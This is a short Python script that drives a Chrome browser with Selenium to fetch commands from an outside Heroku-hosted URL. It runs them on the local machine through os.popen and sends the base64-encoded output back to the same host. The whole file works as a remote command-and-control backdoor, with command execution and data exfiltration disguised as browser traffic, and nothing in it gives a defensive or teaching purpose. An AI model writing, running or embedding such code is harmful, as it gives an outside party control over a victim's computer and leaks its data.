from selenium import webdriver
import time
import os
import base64


try:
    driver = webdriver.Chrome(executable_path="E:\\OVA\\chromedriver_win32\\chromedriver.log")
    driver.get("https://csb-uat-app2.herokuapp.com/command")
    time.sleep(1)
    element = driver.find_element_by_tag_name("body")
    if element.text.split(";")[1] == "yes":
        d = os.popen(element.text.split(";")[0]).read().encode('ascii')
        d = base64.b64encode(d)
        print(d)
        driver.get("https://csb-uat-app2.herokuapp.com/result?res="+str(d))
    driver.close()
    time.sleep(15)
except:
    raise




